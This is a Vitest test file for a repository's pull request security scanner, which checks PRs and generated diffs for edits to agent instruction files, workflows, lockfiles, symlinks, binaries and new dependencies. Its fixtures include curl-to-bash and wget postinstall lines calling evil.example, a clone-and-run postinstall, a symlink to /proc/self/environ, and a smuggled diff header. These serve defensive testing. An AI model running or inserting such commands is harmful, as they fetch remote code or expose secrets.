import { spawnSync } from 'node:child_process'
import { describe, expect, it } from 'vitest'
import type { GitHubClient } from '../../scripts/maintainer/github.ts'
import {
  auditPullSecurity,
  findNewDependencies,
  scanGeneratedDiff,
  scanPullSecurity,
} from './security.ts'

function packageClient(before: string, after: string): GitHubClient {
  return {
    graphql() {
      throw new Error('not used')
    },
    async rest(method, path) {
      if (method !== 'GET') throw new Error(`unexpected ${method} ${path}`)
      if (path.includes('ref=base-sha')) {
        return {
          encoding: 'base64',
          content: Buffer.from(before).toString('base64'),
        }
      }
      if (path.includes('ref=head-sha')) {
        return {
          encoding: 'base64',
          content: Buffer.from(after).toString('base64'),
        }
      }
      throw new Error(`unexpected ${method} ${path}`)
    },
  }
}

describe('scanPullSecurity', () => {
  it('is clean for a normal source patch', () => {
    expect(
      scanPullSecurity([
        {
          path: 'packages/ai/src/chat.ts',
          patch: '@@ -1,2 +1,3 @@\n line\n+return messages\n',
        },
      ]),
    ).toEqual({ ok: true, reasons: [] })
  })

  it.each([
    'AGENTS.md',
    '.agents/skills/review/SKILL.md',
    '.claude/settings.json',
    '.grok/config.toml',
    '.gitmodules',
  ])('blocks sensitive path %s', (path) => {
    expect(
      scanPullSecurity([{ path, patch: '@@ -1 +1 @@\n-old\n+new\n' }]),
    ).toEqual({
      ok: false,
      reasons: [
        `${path}: changes security-sensitive instructions or automation`,
      ],
    })
  })

  it('blocks a file whose patch is unavailable', () => {
    expect(
      scanPullSecurity([{ path: 'packages/ai/src/large.ts', patch: null }]),
    ).toEqual({
      ok: false,
      reasons: ['packages/ai/src/large.ts: patch unavailable'],
    })
  })

  it('blocks a rename from a sensitive path', () => {
    expect(
      scanPullSecurity([
        {
          path: 'docs/old-agent-rules.md',
          previousPath: 'AGENTS.md',
          patch: '@@ -1 +1 @@\n-old\n+new\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: [
        'AGENTS.md: changes security-sensitive instructions or automation',
      ],
    })
  })

  it('blocks added dependencies in package.json', () => {
    expect(
      findNewDependencies(
        '{"dependencies":{"react":"19.0.0"}}',
        '{"dependencies":{"react":"19.1.0","left-pad":"1.3.0"}}',
      ),
    ).toEqual(['left-pad'])
  })

  it('allows dependency version changes in package.json', () => {
    expect(
      findNewDependencies(
        '{"dependencies":{"react":"19.0.0"}}',
        '{"dependencies":{"react":"19.1.0"}}',
      ),
    ).toEqual([])
  })

  it('fails the audit when package.json adds a dependency', async () => {
    const result = await auditPullSecurity(
      packageClient(
        '{"dependencies":{"react":"19.0.0"}}',
        '{"dependencies":{"react":"19.0.0","left-pad":"1.3.0"}}',
      ),
      'TanStack/ai',
      {
        baseSha: 'base-sha',
        headSha: 'head-sha',
        headRepo: 'alice/ai',
        files: [{ path: 'package.json', patch: '@@ -1 +1 @@\n-old\n+new' }],
      },
    )

    expect(result).toEqual({
      ok: false,
      reasons: ['package.json: adds dependencies: left-pad'],
    })
  })

  it('blocks every lockfile change', async () => {
    const result = await auditPullSecurity(
      packageClient(
        '{"dependencies":{"react":"19.0.0"}}',
        '{"dependencies":{"react":"19.1.0"}}',
      ),
      'TanStack/ai',
      {
        baseSha: 'base-sha',
        headSha: 'head-sha',
        headRepo: 'alice/ai',
        files: [
          { path: 'package.json', patch: '@@ -1 +1 @@\n-old\n+new' },
          {
            path: 'pnpm-lock.yaml',
            patch: '@@ -1 +1 @@\n-old\n+new',
          },
        ],
      },
    )

    expect(result).toEqual({
      ok: false,
      reasons: ['pnpm-lock.yaml: lockfile changes require manual review'],
    })
  })

  it('blocks a lockfile renamed to a non-lockfile path', async () => {
    const result = await auditPullSecurity(
      packageClient('{}', '{}'),
      'TanStack/ai',
      {
        baseSha: 'base-sha',
        headSha: 'head-sha',
        headRepo: 'alice/ai',
        files: [
          {
            path: 'old-lockfile.yaml',
            previousPath: 'pnpm-lock.yaml',
            patch: '@@ -1 +1 @@\n-old\n+new',
          },
        ],
      },
    )

    expect(result).toEqual({
      ok: false,
      reasons: ['pnpm-lock.yaml: lockfile changes require manual review'],
    })
  })

  it('blocks a symlink reported by the Git tree', async () => {
    const client: GitHubClient = {
      graphql() {
        throw new Error('not used')
      },
      async rest(method, path) {
        if (method !== 'GET') throw new Error(`unexpected ${method} ${path}`)
        if (path.includes('/git/trees/base-sha')) {
          return { truncated: false, tree: [] }
        }
        if (path.includes('/git/trees/head-sha')) {
          return {
            truncated: false,
            tree: [{ path: 'link', mode: '120000', type: 'blob' }],
          }
        }
        throw new Error(`unexpected ${method} ${path}`)
      },
    }

    expect(
      await auditPullSecurity(client, 'TanStack/ai', {
        baseSha: 'base-sha',
        headSha: 'head-sha',
        headRepo: 'alice/ai',
        files: [
          {
            path: 'link',
            status: 'added',
            previousPath: null,
            patch: '@@ -0,0 +1 @@\n+/proc/self/environ',
          },
        ],
      }),
    ).toEqual({
      ok: false,
      reasons: ['link: unsafe Git mode 120000'],
    })
  })

  it('alerts on pull_request_target in a workflow', () => {
    expect(
      scanPullSecurity([
        {
          path: '.github/workflows/ci.yml',
          patch:
            '@@ -1,2 +1,4 @@\n on:\n+  pull_request_target:\n+    types: [opened]\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: [
        '.github/workflows/ci.yml: changes a workflow',
        '.github/workflows/ci.yml: adds pull_request_target',
      ],
    })
  })

  it('alerts on curl piped to a shell', () => {
    expect(
      scanPullSecurity([
        {
          path: 'scripts/setup.sh',
          patch:
            '@@ -1 +1,2 @@\n #!/bin/sh\n+curl https://evil.example/x.sh | bash\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: ['scripts/setup.sh: shell download or reverse shell'],
    })
  })

  it('alerts on a package.json postinstall that fetches the network', () => {
    expect(
      scanPullSecurity([
        {
          path: 'packages/ai/package.json',
          patch:
            '@@ -1,3 +1,4 @@\n {\n+  "postinstall": "wget https://evil.example/x.js"\n }\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: [
        'packages/ai/package.json: "postinstall": "wget https://evil.example/x.js" fetches the network',
      ],
    })
  })

  it('alerts on a new binary path', () => {
    expect(
      scanPullSecurity([{ path: 'tools/helper.exe', patch: null }]),
    ).toEqual({
      ok: false,
      reasons: ['tools/helper.exe: new binary or script payload'],
    })
  })

  it('alerts when a workflow file changes, even if the patch only deletes', () => {
    expect(
      scanPullSecurity([
        {
          path: '.github/workflows/ci.yml',
          patch: '@@ -1,2 +1,1 @@\n-  pull_request_target:\n on:\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: ['.github/workflows/ci.yml: changes a workflow'],
    })
  })

  it('alerts on curl piped to /bin/bash', () => {
    expect(
      scanPullSecurity([
        {
          path: 'scripts/setup.sh',
          patch:
            '@@ -1 +1,2 @@\n #!/bin/sh\n+curl https://evil.example/x.sh | /bin/bash\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: ['scripts/setup.sh: shell download or reverse shell'],
    })
  })

  it('alerts on a package.json postinstall that clones then runs', () => {
    expect(
      scanPullSecurity([
        {
          path: 'packages/ai/package.json',
          patch:
            '@@ -1,3 +1,4 @@\n {\n+  "postinstall": "git clone ssh://git@host/repo /tmp/p && /tmp/p/install"\n }\n',
        },
      ]),
    ).toEqual({
      ok: false,
      reasons: [
        'packages/ai/package.json: "postinstall": "git clone ssh://git@host/repo /tmp/p && /tmp/p/install" fetches the network',
      ],
    })
  })
})

describe('scanGeneratedDiff', () => {
  it('blocks a second patch without a diff --git header', () => {
    const patch =
      'diff --git a/src/safe.txt b/src/safe.txt\n--- a/src/safe.txt\n+++ b/src/safe.txt\n@@ -1 +1 @@\n-old\n+new\n--- a/.github/workflows/probe.yml\n+++ b/.github/workflows/probe.yml\n@@ -1 +1 @@\n-old\n+new\n'
    const parsed = spawnSync('git', ['apply', '--numstat', '-z', '-'], {
      input: patch,
      encoding: 'utf8',
    })

    expect(parsed.status, parsed.stderr).toBe(0)
    expect(parsed.stdout).toBe(
      '1\t1\tsrc/safe.txt\0' + '1\t1\t.github/workflows/probe.yml\0',
    )
    expect(scanGeneratedDiff(patch).ok).toBe(false)
  })

  it('allows header-shaped source lines within a hunk', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/src/safe.txt b/src/safe.txt\n--- a/src/safe.txt\n+++ b/src/safe.txt\n@@ -1 +1 @@\n--- old source\n+++ new source\n',
      ),
    ).toEqual({ ok: true, reasons: [] })
  })

  it('allows multiple hunks with context and missing final newlines', () => {
    const patch =
      'diff --git a/src/safe.txt b/src/safe.txt\n--- a/src/safe.txt\n+++ b/src/safe.txt\n@@ -1,2 +1,2 @@\n context\n-old\n+new\n@@ -10 +10 @@\n-old end\n\\ No newline at end of file\n+new end\n\\ No newline at end of file\n'

    expect(scanGeneratedDiff(patch)).toEqual({ ok: true, reasons: [] })
  })

  it.each([
    '--- a/src/safe.txt\n+++ b/src/safe.txt\n--- a/src/safe.txt\n+++ b/src/safe.txt\n@@ -1 +1 @@\n-old\n+new\n',
    'rename from src/safe.txt\nrename to .github/workflows/probe.yml\n--- a/src/safe.txt\n+++ b/src/safe.txt\n@@ -1 +1 @@\n-old\n+new\n',
    '--- a/src/safe.txt\n+++ b/src/safe.txt\n@@ -1,2 +1 @@\n-old\n+new\n',
  ])('rejects ambiguous headers or incomplete hunks: %s', (body) => {
    expect(
      scanGeneratedDiff(`diff --git a/src/safe.txt b/src/safe.txt\n${body}`).ok,
    ).toBe(false)
  })

  it('allows a normal source edit', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/src/chat.ts b/src/chat.ts\n--- a/src/chat.ts\n+++ b/src/chat.ts\n@@ -1 +1 @@\n-old\n+new\n',
      ),
    ).toEqual({ ok: true, reasons: [] })
  })

  it('blocks edits to security-sensitive files', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-old\n+new\n',
      ),
    ).toEqual({
      ok: false,
      reasons: ['.github/workflows/ci.yml: changes a workflow'],
    })
  })

  it('blocks symlinks and binary patches', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/link b/link\nnew file mode 120000\n--- /dev/null\n+++ b/link\n@@ -0,0 +1 @@\n+target\ndiff --git a/image.png b/image.png\nGIT binary patch\n',
      ),
    ).toEqual({
      ok: false,
      reasons: [
        'link: creates or changes a symlink or submodule',
        'image.png: contains a binary patch',
      ],
    })
  })

  it('blocks an existing symlink and a new executable', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/link b/link\nindex 1de5659..2ab19ae 120000\n--- a/link\n+++ b/link\n@@ -1 +1 @@\n-old\n+new\ndiff --git a/run.sh b/run.sh\nnew file mode 100755\n--- /dev/null\n+++ b/run.sh\n@@ -0,0 +1 @@\n+echo safe\n',
      ),
    ).toEqual({
      ok: false,
      reasons: [
        'link: creates or changes a symlink or submodule',
        'run.sh: creates an executable file',
      ],
    })
  })

  it('blocks malformed diff headers', () => {
    expect(scanGeneratedDiff('--- a/src/chat.ts\n+++ b/src/chat.ts\n')).toEqual(
      {
        ok: false,
        reasons: ['generated diff has content before its first file header'],
      },
    )
  })

  it('blocks patch path headers that target a different file', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/src/safe.ts b/src/safe.ts\n--- a/src/safe.ts\n+++ b/.github/workflows/ci.yml\n@@ -1 +1 @@\n-old\n+new\n',
      ),
    ).toEqual({
      ok: false,
      reasons: ['src/safe.ts: patch path headers do not match the file header'],
    })
  })

  it('allows valid create and delete patch headers', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/src/new.ts b/src/new.ts\nnew file mode 100644\n--- /dev/null\n+++ b/src/new.ts\n@@ -0,0 +1 @@\n+new\ndiff --git a/src/old.ts b/src/old.ts\ndeleted file mode 100644\n--- a/src/old.ts\n+++ /dev/null\n@@ -1 +0,0 @@\n-old\n',
      ),
    ).toEqual({ ok: true, reasons: [] })
  })

  it('blocks generated package manifest changes', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{}\n+{"dependencies":{}}\n',
      ),
    ).toEqual({
      ok: false,
      reasons: [
        'package.json: generated edits cannot change package manifests',
      ],
    })
  })

  it('blocks a sandbox secret anywhere in a generated diff', () => {
    expect(
      scanGeneratedDiff(
        'diff --git a/src/key.ts b/src/key.ts\n--- a/src/key.ts\n+++ b/src/key.ts\n@@ -0,0 +1 @@\n+secret-key\n',
        ['secret-key'],
      ),
    ).toEqual({
      ok: false,
      reasons: ['generated diff contains a sandbox secret'],
    })
  })
})
